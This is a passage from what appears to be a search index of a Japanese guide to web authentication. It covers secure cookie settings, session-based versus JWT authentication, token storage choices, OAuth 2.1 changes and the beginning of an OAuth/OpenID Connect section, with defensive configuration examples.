\u30ea\u30d7\u30ec\u30a4\u30a2\u30bf\u30c3\u30af\u5bfe\u7b56\u7528\u306e\u30e9\u30f3\u30c0\u30e0\u6587\u5b57\u5217"},{"location":"auth-basics/#cookie","title":"Cookie\u5c5e\u6027","text":"\u5c5e\u6027 \u8aac\u660e HttpOnly JavaScript\u304b\u3089\u30a2\u30af\u30bb\u30b9\u4e0d\u53ef(XSS\u5bfe\u7b56) Secure HTTPS\u901a\u4fe1\u3067\u306e\u307f\u9001\u4fe1 SameSite \u30af\u30ed\u30b9\u30b5\u30a4\u30c8\u30ea\u30af\u30a8\u30b9\u30c8\u3067\u306e\u9001\u4fe1\u5236\u5fa1(CSRF\u5bfe\u7b56)"},{"location":"auth-basics/#_24","title":"\u6b21\u306e\u30b9\u30c6\u30c3\u30d7","text":"<p>\u57fa\u790e\u77e5\u8b58\u3092\u7406\u89e3\u3057\u305f\u3089\u3001\u4ee5\u4e0b\u306e\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306b\u9032\u3093\u3067\u304f\u3060\u3055\u3044:</p> <ol> <li>OAuth 2.0 / OpenID Connect - \u8a8d\u8a3c\u30d7\u30ed\u30c8\u30b3\u30eb\u306e\u8a73\u7d30</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 - \u8105\u5a01\u3068\u5bfe\u7b56</li> <li>\u5b9f\u88c5\u30ac\u30a4\u30c9 - \u5b9f\u969b\u306e\u5b9f\u88c5\u65b9\u6cd5</li> </ol> <p>\u6700\u7d42\u66f4\u65b0: 2025\u5e7410\u670815\u65e5 \u5bfe\u8c61\u8aad\u8005: \u8a8d\u8a3c\u6a5f\u80fd\u306e\u5b9f\u88c5\u3092\u5b66\u3076\u958b\u767a\u8005(\u521d\u7d1a\u301c\u4e2d\u7d1a)</p>"},{"location":"authentication-guide/","title":"Web\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306b\u304a\u3051\u308b\u8a8d\u8a3c\u6a5f\u80fd\u306e\u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9 (2025\u5e74\u7248)","text":"<p>\ud83d\udcd6 \u8a8d\u8a3c\u30fb\u8a8d\u53ef &gt; \u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9 \u672c\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306f\u3001\u8a8d\u8a3c\u6a5f\u80fd\u306b\u95a2\u3059\u308b\u5305\u62ec\u7684\u306a\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9\u3067\u3059\u3002\u5404\u8a8d\u8a3c\u65b9\u5f0f\u306e\u8a73\u7d30\u3001\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u30d1\u30bf\u30fc\u30f3\u3001\u6700\u65b0\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6280\u8853(PAR\u3001DPoP\u3001mTLS\u3001FAPI\u7b49)\u3001\u30ec\u30ac\u30b7\u30fc\u30b7\u30b9\u30c6\u30e0\u306e\u30e2\u30c0\u30ca\u30a4\u30bc\u30fc\u30b7\u30e7\u30f3\u306a\u3069\u3092\u7db2\u7f85\u7684\u306b\u89e3\u8aac\u3057\u3066\u3044\u307e\u3059\u3002</p>"},{"location":"authentication-guide/#_1","title":"\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306e\u4f4d\u7f6e\u3065\u3051","text":"<ul> <li>\u57fa\u790e\u3092\u5b66\u3076: \u6982\u8981 \u2192 OAuth 2.0 / OIDC \u2192 \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56</li> <li>\u5b9f\u88c5\u3059\u308b: \u5b9f\u88c5\u30ac\u30a4\u30c9</li> <li>\u6df1\u304f\u7406\u89e3\u3059\u308b: \u672c\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8(\u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9)</li> </ul>"},{"location":"authentication-guide/#_2","title":"\u95a2\u9023\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8","text":"<ul> <li>\u6982\u8981 - \u8a8d\u8a3c\u30fb\u8a8d\u53ef\u306e\u57fa\u790e</li> <li>OAuth 2.0 / OIDC - \u30d7\u30ed\u30c8\u30b3\u30eb\u306e\u8a73\u7d30</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 - \u8105\u5a01\u3068\u5bfe\u7b56</li> <li>\u5b9f\u88c5\u30ac\u30a4\u30c9 - Next.js + Spring Boot + Cognito \u306e\u5b9f\u88c5</li> </ul>"},{"location":"authentication-guide/#_3","title":"\u76ee\u6b21","text":"<ol> <li>\u8a8d\u8a3c\u6a5f\u80fd\u306e\u5f79\u5272</li> <li>2025\u5e74\u306e\u6700\u65b0\u52d5\u5411\u3068\u30d6\u30e9\u30a6\u30b6\u4e8b\u60c5</li> <li>\u4ee3\u8868\u7684\u306a\u8a8d\u8a3c\u5b9f\u88c5\u30d1\u30bf\u30fc\u30f3</li> <li>\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u30d1\u30bf\u30fc\u30f3\u5225\u306e\u5b9f\u88c5\u65b9\u91dd</li> <li>\u6700\u65b0\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5f37\u5316\u6280\u8853</li> <li>Next.js + Spring Boot + AWS Cognito\u69cb\u6210\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9</li> </ol>"},{"location":"authentication-guide/#_4","title":"\u8a8d\u8a3c\u6a5f\u80fd\u306e\u5f79\u5272","text":""},{"location":"authentication-guide/#authentication","title":"\u8a8d\u8a3c(Authentication)\u3068\u306f","text":"<p>\u8a8d\u8a3c\u3068\u306f\u3001**\u300c\u3042\u306a\u305f\u306f\u8ab0\u3067\u3059\u304b?\u300d**\u3068\u3044\u3046\u554f\u3044\u306b\u7b54\u3048\u308b\u30d7\u30ed\u30bb\u30b9\u3067\u3059\u3002\u30e6\u30fc\u30b6\u30fc\u304c\u672c\u4eba\u3067\u3042\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3057\u3001\u30b7\u30b9\u30c6\u30e0\u3078\u306e\u30a2\u30af\u30bb\u30b9\u3092\u8a31\u53ef\u3059\u308b\u4ed5\u7d44\u307f\u3067\u3059\u3002</p>"},{"location":"authentication-guide/#_5","title":"\u4e3b\u306a\u5f79\u5272","text":"<ul> <li>\u672c\u4eba\u78ba\u8a8d: \u30e6\u30fc\u30b6\u30fc\u304c\u4e3b\u5f35\u3059\u308b\u8eab\u5143\u304c\u6b63\u3057\u3044\u3053\u3068\u3092\u78ba\u8a8d</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u4fdd\u8b77: \u4e0d\u6b63\u30a2\u30af\u30bb\u30b9\u304b\u3089\u30b7\u30b9\u30c6\u30e0\u3068\u30c7\u30fc\u30bf\u3092\u5b88\u308b</li> <li>\u30a2\u30af\u30bb\u30b9\u5236\u5fa1\u306e\u57fa\u76e4: \u8a8d\u8a3c\u5f8c\u306b\u9069\u5207\u306a\u6a29\u9650\u3092\u4ed8\u4e0e(\u8a8d\u53ef)</li> <li>\u76e3\u67fb\u8a3c\u8de1: \u8ab0\u304c\u3044\u3064\u30a2\u30af\u30bb\u30b9\u3057\u305f\u304b\u3092\u8a18\u9332</li> </ul>"},{"location":"authentication-guide/#_6","title":"\u8a8d\u8a3c\u3068\u8a8d\u53ef\u306e\u9055\u3044","text":"\u9805\u76ee \u8a8d\u8a3c(Authentication) \u8a8d\u53ef(Authorization) \u554f\u3044 \u300c\u3042\u306a\u305f\u306f\u8ab0?\u300d \u300c\u3042\u306a\u305f\u306f\u4f55\u304c\u3067\u304d\u308b?\u300d \u76ee\u7684 \u8eab\u5143\u78ba\u8a8d \u6a29\u9650\u78ba\u8a8d \u30bf\u30a4\u30df\u30f3\u30b0 \u30a2\u30af\u30bb\u30b9\u6642 \u30ea\u30bd\u30fc\u30b9\u64cd\u4f5c\u6642 \u4f8b \u30ed\u30b0\u30a4\u30f3 \u7ba1\u7406\u8005\u753b\u9762\u3078\u306e\u30a2\u30af\u30bb\u30b9"},{"location":"authentication-guide/#oauthoidc","title":"\u95a2\u4fc2\u8005\u3068\u5f79\u5272(OAuth/OIDC\u524d\u63d0)","text":"<ul> <li>\u30e6\u30fc\u30b6\u30fc(\u4e3b\u4f53): \u8a8d\u8a3c\u3092\u53d7\u3051\u308b\u4eba</li> <li>\u30af\u30e9\u30a4\u30a2\u30f3\u30c8: \u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3(\u30d6\u30e9\u30a6\u30b6/\u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea)</li> <li>\u8a8d\u53ef\u30b5\u30fc\u30d0/IdP (Identity Provider): \u8a8d\u8a3c\u3068\u30c8\u30fc\u30af\u30f3\u767a\u884c\u3092\u62c5\u5f53(AWS Cognito, Auth0\u7b49)</li> <li>\u30ea\u30bd\u30fc\u30b9\u30b5\u30fc\u30d0(API): \u30d3\u30b8\u30cd\u30b9\u30ed\u30b8\u30c3\u30af\u3068\u30c7\u30fc\u30bf\u3092\u63d0\u4f9b\u3059\u308b\u30d0\u30c3\u30af\u30a8\u30f3\u30c9</li> <li>SP/RP (\u30ea\u30e9\u30a4\u30f3\u30b0\u30d1\u30fc\u30c6\u30a3): IdP\u3092\u4fe1\u983c\u3057\u3066\u30e6\u30fc\u30b6\u30fc\u3092\u53d7\u3051\u5165\u308c\u308b\u5074</li> </ul>"},{"location":"authentication-guide/#2025","title":"2025\u5e74\u306e\u6700\u65b0\u52d5\u5411\u3068\u30d6\u30e9\u30a6\u30b6\u4e8b\u60c5","text":""},{"location":"authentication-guide/#cookie","title":"\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u306e\u6bb5\u968e\u7684\u5ec3\u6b62","text":"<p>2024\u5e74\u304b\u3089Chrome\u3092\u306f\u3058\u3081\u3068\u3059\u308b\u4e3b\u8981\u30d6\u30e9\u30a6\u30b6\u3067\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u306e\u6bb5\u968e\u7684\u5ec3\u6b62\u304c\u9032\u3093\u3067\u3044\u307e\u3059\u3002</p>"},{"location":"authentication-guide/#_7","title":"\u5f71\u97ff","text":"<ul> <li>\u274c \u5f93\u6765\u306e\u30b5\u30a4\u30ec\u30f3\u30c8\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5(\u96a0\u3057iframe)\u304c\u4f7f\u3048\u306a\u3044</li> <li>\u274c IdP\u306e\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u4f9d\u5b58SSO\u304c\u56f0\u96e3\u306b</li> <li>\u274c \u30af\u30ed\u30b9\u30b5\u30a4\u30c8\u3067\u306e\u30bb\u30c3\u30b7\u30e7\u30f3\u7dad\u6301\u304c\u5236\u9650</li> </ul>"},{"location":"authentication-guide/#_8","title":"\u5bfe\u7b56","text":"<ul> <li>\u2705 BFF(Backend For Frontend)\u30d1\u30bf\u30fc\u30f3\u306e\u63a1\u7528 \u2190 2025\u5e74\u306e\u4e3b\u6d41</li> <li>\u2705 \u540c\u4e00\u30b5\u30a4\u30c8Cookie\u904b\u7528</li> <li>\u2705 FedCM(Federated Credential Management)\u306e\u6d3b\u7528 \u2190 Chrome\u672c\u683c\u5c0e\u5165\u6e08\u307f</li> <li>\u2705 Authorization Code + PKCE \u30d5\u30ed\u30fc</li> </ul>"},{"location":"authentication-guide/#samesite","title":"SameSite\u5c5e\u6027\u306e\u5f37\u5316","text":"<pre><code>// \u63a8\u5968Cookie\u8a2d\u5b9a\nSet-Cookie: session_id=xxx;\n  HttpOnly;           // JavaScript\u304b\u3089\u30a2\u30af\u30bb\u30b9\u4e0d\u53ef(XSS\u5bfe\u7b56)\n  Secure;             // HTTPS\u901a\u4fe1\u306e\u307f\n  SameSite=Strict;    // \u30af\u30ed\u30b9\u30b5\u30a4\u30c8\u30ea\u30af\u30a8\u30b9\u30c8\u3067\u9001\u4fe1\u3057\u306a\u3044(CSRF\u5bfe\u7b56)\n  Max-Age=86400       // \u6709\u52b9\u671f\u9650\n</code></pre>"},{"location":"authentication-guide/#_9","title":"\u305d\u306e\u4ed6\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5f37\u5316","text":"<ul> <li>CSP(Content Security Policy): XSS\u653b\u6483\u3092\u9632\u3050HTTP\u30d8\u30c3\u30c0\u30fc</li> <li>Trusted Types: DOM\u64cd\u4f5c\u306e\u30b5\u30cb\u30bf\u30a4\u30ba\u3092\u5f37\u5236</li> <li>HSTS: HTTPS\u901a\u4fe1\u3092\u5f37\u5236</li> </ul>"},{"location":"authentication-guide/#oauth-21","title":"OAuth 2.1\u3078\u306e\u79fb\u884c","text":"<p>OAuth 2.1\u306f\u696d\u754c\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9\u3092\u6a19\u6e96\u5316\u3057\u305f\u6700\u65b0\u4ed5\u69d8\u3067\u3059\u3002</p>"},{"location":"authentication-guide/#_10","title":"\u4e3b\u306a\u5909\u66f4\u70b9","text":"<ul> <li>\u2705 Authorization Code + PKCE \u3092\u6a19\u6e96\u5316</li> <li>\u274c Implicit Flow \u306f\u975e\u63a8\u5968(\u5ec3\u6b62)</li> <li>\u274c Resource Owner Password Credentials (ROPC) \u306f\u975e\u63a8\u5968</li> <li>\u2705 \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u306e\u53b3\u683c\u306a\u4e00\u81f4\u5fc5\u9808</li> <li>\u2705 state/nonce \u30d1\u30e9\u30e1\u30fc\u30bf\u5fc5\u9808\u5316</li> </ul>"},{"location":"authentication-guide/#_11","title":"\u4ee3\u8868\u7684\u306a\u8a8d\u8a3c\u5b9f\u88c5\u30d1\u30bf\u30fc\u30f3","text":""},{"location":"authentication-guide/#1","title":"1. \u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c","text":""},{"location":"authentication-guide/#_12","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u6982\u8981","text":"<p>\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\u3092\u4fdd\u6301\u3057\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306b\u306f\u30bb\u30c3\u30b7\u30e7\u30f3ID\u306e\u307f\u3092\u6e21\u3059\u4f1d\u7d71\u7684\u306a\u65b9\u5f0f\u3002</p>"},{"location":"authentication-guide/#_13","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u901a\u4fe1\u30d5\u30ed\u30fc","text":"<pre><code>sequenceDiagram\n    participant Client as \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\n    participant Server as \u30b5\u30fc\u30d0\u30fc\n    participant Store as \u30bb\u30c3\u30b7\u30e7\u30f3\u30b9\u30c8\u30a2\n\n    Client-&gt;&gt;Server: 1. \u30ed\u30b0\u30a4\u30f3\u60c5\u5831(ID/\u30d1\u30b9\u30ef\u30fc\u30c9)\u9001\u4fe1\n    Server-&gt;&gt;Server: 2. \u8a8d\u8a3c\u6210\u529f\n    Server-&gt;&gt;Store: \u30bb\u30c3\u30b7\u30e7\u30f3\u4f5c\u6210\u30fb\u4fdd\u5b58\n    Server-&gt;&gt;Client: 3. Set-Cookie: session_id=xxxxx\n    Client-&gt;&gt;Server: 4. Cookie: session_id=xxxxx (\u4ee5\u964d\u306e\u30ea\u30af\u30a8\u30b9\u30c8)\n    Server-&gt;&gt;Store: 5. \u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\u53d6\u5f97\n    Store-&gt;&gt;Server: \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\n    Server-&gt;&gt;Server: \u51e6\u7406\u5b9f\u884c</code></pre>"},{"location":"authentication-guide/#_14","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u2705 \u30b5\u30fc\u30d0\u30fc\u5074\u3067\u30bb\u30c3\u30b7\u30e7\u30f3\u3092\u5373\u5ea7\u306b\u7121\u52b9\u5316\u53ef\u80fd</li> <li>\u2705 \u5b9f\u88c5\u304c\u30b7\u30f3\u30d7\u30eb\u3067\u7406\u89e3\u3057\u3084\u3059\u3044</li> <li>\u2705 \u53e4\u3044\u30d6\u30e9\u30a6\u30b6\u3067\u3082\u52d5\u4f5c</li> <li>\u2705 \u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\u3092\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u5b8c\u5168\u5236\u5fa1</li> </ul>"},{"location":"authentication-guide/#_15","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u30c7\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u274c \u30b5\u30fc\u30d0\u30fc\u306b\u30bb\u30c3\u30b7\u30e7\u30f3\u4fdd\u5b58\u9818\u57df\u304c\u5fc5\u8981(\u30e1\u30e2\u30ea\u3084Redis)</li> <li>\u274c \u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u6642\u306b\u30bb\u30c3\u30b7\u30e7\u30f3\u5171\u6709\u306e\u4ed5\u7d44\u307f\u304c\u5fc5\u8981</li> <li>\u274c CSRF\u653b\u6483\u3078\u306e\u5bfe\u7b56\u304c\u5fc5\u9808</li> <li>\u274c \u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u3067\u306eCookie\u7ba1\u7406\u304c\u8907\u96d1</li> </ul>"},{"location":"authentication-guide/#_16","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u9069\u7528\u30b7\u30fc\u30f3","text":"<ul> <li>\u7ba1\u7406\u753b\u9762\u3084\u30a8\u30f3\u30bf\u30fc\u30d7\u30e9\u30a4\u30ba\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3</li> <li>\u30ea\u30a2\u30eb\u30bf\u30a4\u30e0\u306a\u30bb\u30c3\u30b7\u30e7\u30f3\u7ba1\u7406\u304c\u91cd\u8981\u306a\u5834\u5408</li> <li>\u30d5\u30eb\u30b9\u30bf\u30c3\u30af\u30d5\u30ec\u30fc\u30e0\u30ef\u30fc\u30af(Rails, Django, PHP)\u3067\u306e\u5b9f\u88c5</li> </ul>"},{"location":"authentication-guide/#_17","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u6ce8\u610f\u30dd\u30a4\u30f3\u30c8","text":"<ul> <li>CSRF\u5bfe\u7b56: CSRF\u30c8\u30fc\u30af\u30f3\u306e\u5b9f\u88c5\u5fc5\u9808</li> <li>\u30bb\u30c3\u30b7\u30e7\u30f3\u56fa\u5b9a\u653b\u6483: \u30ed\u30b0\u30a4\u30f3\u6210\u529f\u6642\u306b\u30bb\u30c3\u30b7\u30e7\u30f3ID\u3092\u518d\u751f\u6210</li> <li>\u30bb\u30c3\u30b7\u30e7\u30f3\u30bf\u30a4\u30e0\u30a2\u30a6\u30c8: \u9069\u5207\u306a\u6709\u52b9\u671f\u9650\u8a2d\u5b9a(\u30a2\u30a4\u30c9\u30eb\u3068\u7d76\u5bfe\u30bf\u30a4\u30e0\u30a2\u30a6\u30c8\u306e\u4f75\u7528)</li> <li>Secure/HttpOnly/SameSite\u5c5e\u6027: Cookie\u306e\u9069\u5207\u306a\u8a2d\u5b9a</li> </ul>"},{"location":"authentication-guide/#cookie_1","title":"Cookie\u8a2d\u5b9a\u4f8b","text":"<pre><code>// Express.js\napp.use(session({\n  name: 'sessionId',\n  secret: process.env.SESSION_SECRET,\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    secure: true,        // HTTPS\u5fc5\u9808\n    httpOnly: true,      // XSS\u5bfe\u7b56\n    sameSite: 'strict',  // CSRF\u5bfe\u7b56\n    maxAge: 3600000      // 1\u6642\u9593\n  }\n}));\n</code></pre>"},{"location":"authentication-guide/#2-jwt","title":"2. \u30c8\u30fc\u30af\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c(JWT)","text":""},{"location":"authentication-guide/#_18","title":"\u30c8\u30fc\u30af\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u6982\u8981","text":"<p>\u30b5\u30fc\u30d0\u30fc\u304c\u7f72\u540d\u4ed8\u304d\u30c8\u30fc\u30af\u30f3(JWT: JSON Web Token)\u3092\u767a\u884c\u3057\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u3067\u4fdd\u6301\u3059\u308b\u65b9\u5f0f\u3002</p>"},{"location":"authentication-guide/#jwt","title":"JWT\u306e\u69cb\u9020","text":"<pre><code>Header.Payload.Signature\neyJhbGc...(Base64).eyJ1c2Vy...(Base64).SflKxwRJ...(\u7f72\u540d)\n</code></pre> <ul> <li>Header: \u30a2\u30eb\u30b4\u30ea\u30ba\u30e0\u60c5\u5831(HS256, RS256\u306a\u3069)</li> <li>Payload: \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u3001\u6709\u52b9\u671f\u9650\u306a\u3069</li> <li>Signature: \u6539\u3056\u3093\u691c\u77e5\u7528\u306e\u7f72\u540d</li> </ul>"},{"location":"authentication-guide/#_19","title":"\u30c8\u30fc\u30af\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u901a\u4fe1\u30d5\u30ed\u30fc","text":"<pre><code>sequenceDiagram\n    participant Client as \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\n    participant Server as \u30b5\u30fc\u30d0\u30fc\n\n    Client-&gt;&gt;Server: 1. \u30ed\u30b0\u30a4\u30f3\u60c5\u5831\u9001\u4fe1\n    Server-&gt;&gt;Server: 2. \u8a8d\u8a3c\u6210\u529f\u30fbJWT\u751f\u6210(\u7f72\u540d)\n    Server-&gt;&gt;Client: 3. { \"access_token\": \"eyJhbGc...\" }\n    Client-&gt;&gt;Client: 4. JWT\u3092LocalStorage/SessionStorage\u306b\u4fdd\u5b58\n    Client-&gt;&gt;Server: 5. Authorization: Bearer eyJhbGc...\n    Server-&gt;&gt;Server: 6. JWT\u691c\u8a3c(\u7f72\u540d\u78ba\u8a8d\u3001\u6709\u52b9\u671f\u9650\u30c1\u30a7\u30c3\u30af)\n    Server-&gt;&gt;Server: \u51e6\u7406\u5b9f\u884c</code></pre>"},{"location":"authentication-guide/#_20","title":"\u30c8\u30fc\u30af\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u2705 \u30b9\u30c6\u30fc\u30c8\u30ec\u30b9(\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u30bb\u30c3\u30b7\u30e7\u30f3\u4fdd\u6301\u4e0d\u8981)</li> <li>\u2705 \u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u304c\u5bb9\u6613</li> <li>\u2705 \u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\u9593\u3067\u306e\u8a8d\u8a3c\u60c5\u5831\u5171\u6709\u304c\u7c21\u5358</li> <li>\u2705 \u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u3068\u306e\u76f8\u6027\u304c\u826f\u3044</li> <li>\u2705 CORS\u5bfe\u5fdc\u304c\u5bb9\u6613</li> </ul>"},{"location":"authentication-guide/#_21","title":"\u30c8\u30fc\u30af\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u30c7\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u274c \u30c8\u30fc\u30af\u30f3\u306e\u5373\u5ea7\u306a\u7121\u52b9\u5316\u304c\u56f0\u96e3</li> <li>\u274c \u30c8\u30fc\u30af\u30f3\u30b5\u30a4\u30ba\u304c\u5927\u304d\u3044(\u6bce\u56de\u9001\u4fe1\u306e\u30aa\u30fc\u30d0\u30fc\u30d8\u30c3\u30c9)</li> <li>\u274c XSS\u653b\u6483\u3067\u30c8\u30fc\u30af\u30f3\u304c\u76d7\u307e\u308c\u308b\u30ea\u30b9\u30af</li> <li>\u274c \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u306e\u7ba1\u7406\u304c\u5fc5\u8981</li> </ul>"},{"location":"authentication-guide/#_22","title":"\u30c8\u30fc\u30af\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u9069\u7528\u30b7\u30fc\u30f3","text":"<ul> <li>SPA(Single Page Application) + API\u30b5\u30fc\u30d0\u30fc\u69cb\u6210</li> <li>\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3</li> <li>\u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u306e\u30d0\u30c3\u30af\u30a8\u30f3\u30c9API</li> <li>\u8907\u6570\u30b5\u30fc\u30d3\u30b9\u9593\u3067\u306e\u8a8d\u8a3c\u60c5\u5831\u5171\u6709</li> </ul>"},{"location":"authentication-guide/#_23","title":"\u30c8\u30fc\u30af\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c\u306e\u6ce8\u610f\u30dd\u30a4\u30f3\u30c8","text":"<ul> <li>\u30c8\u30fc\u30af\u30f3\u306e\u4fdd\u5b58\u5834\u6240: LocalStorage(XSS\u6ce8\u610f)\u3001HttpOnly Cookie\u63a8\u5968</li> <li>\u6709\u52b9\u671f\u9650: \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u306f\u77ed\u3081(15\u5206\u301c1\u6642\u9593)</li> <li>\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3: \u9577\u671f\u9593\u6709\u52b9\u306a\u30c8\u30fc\u30af\u30f3\u3067\u518d\u767a\u884c</li> <li>\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3: \u4f7f\u3044\u6368\u3066\uff0b\u518d\u5229\u7528\u691c\u77e5\u3067\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5f37\u5316</li> <li>\u7f72\u540d\u30a2\u30eb\u30b4\u30ea\u30ba\u30e0: RS256/ES256(\u516c\u958b\u9375\u65b9\u5f0f)\u63a8\u5968\u3001HS256\u306f\u5171\u901a\u9375</li> <li>\u30d6\u30e9\u30c3\u30af\u30ea\u30b9\u30c8: \u30ed\u30b0\u30a2\u30a6\u30c8\u6642\u306b\u30c8\u30fc\u30af\u30f3\u3092\u7121\u52b9\u5316\u30ea\u30b9\u30c8\u306b\u8ffd\u52a0</li> <li>\u30c8\u30fc\u30af\u30f3\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0: DPoP/mTLS\u3067\u30c8\u30fc\u30af\u30f3\u3092\u30af\u30e9\u30a4\u30a2\u30f3\u30c8/\u63a5\u7d9a\u306b\u30d0\u30a4\u30f3\u30c9</li> </ul>"},{"location":"authentication-guide/#2025_1","title":"\u30c8\u30fc\u30af\u30f3\u4fdd\u5b58\u5834\u6240\u306e\u6bd4\u8f03(2025\u5e74\u7248)","text":"\u4fdd\u5b58\u5834\u6240 XSS\u8010\u6027 CSRF\u8010\u6027 \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u6642\u306e\u6d88\u5931 \u63a8\u5968\u5ea6 HttpOnly Cookie \u2705 \u9ad8 \u26a0\ufe0f \u8981\u5bfe\u7b56 \u274c \u306a\u3057 \ud83c\udf1f \u6700\u63a8\u5968 \u30e1\u30e2\u30ea(State\u7ba1\u7406) \u2705 \u9ad8 \u2705 \u9ad8 \u274c \u3042\u308a \u2705 \u63a8\u5968 SessionStorage \u274c \u4f4e \u2705 \u9ad8 \u274c \u3042\u308a \u26a0\ufe0f \u6761\u4ef6\u4ed8\u304d LocalStorage \u274c \u4f4e \u2705 \u9ad8 \u2705 \u306a\u3057 \u274c \u975e\u63a8\u5968 <p>2025\u5e74\u306e\u63a8\u5968: BFF\u30d1\u30bf\u30fc\u30f3(\u5f8c\u8ff0)\u3067\u30c8\u30fc\u30af\u30f3\u3092\u30b5\u30fc\u30d0\u30fc\u5074\u7ba1\u7406\u3001\u307e\u305f\u306fHttpOnly Cookie + \u30e1\u30e2\u30ea\u306e\u7d44\u307f\u5408\u308f\u305b</p>"},{"location":"authentication-guide/#3-oauth-20-openid-connect","title":"3. OAuth 2.0 / OpenID Connect","text":""},{"location":"authentication-guide/#oauthoidc_1","title":"OAuth/OIDC\u306e\u6982\u8981","text":"<p>\u5916\u90e8\u306e\u8a8d\u8a3c\u30d7\u30ed\u30d0\u30a4\u30c0\u30fc(Google, GitHub, AWS Cognito\u7b49)\u3092\u5229\u7528\u3057\u305f\u8a8d\u8a3c\u65b9\u5f0f\u3002</p>"},{"location":"authentication-guide/#_24","title":"\u4e3b\u8981\u306a\u6982\u5ff5","text":"<ul> <li>\u8a8d\u8a3c\u30d7\u30ed\u30d0\u30a4\u30c0\u30fc(IdP): \u8a8d\u8a3c\u3092\u63d0\u4f9b\u3059\u308b\u30b5\u30fc\u30d3\u30b9</li> 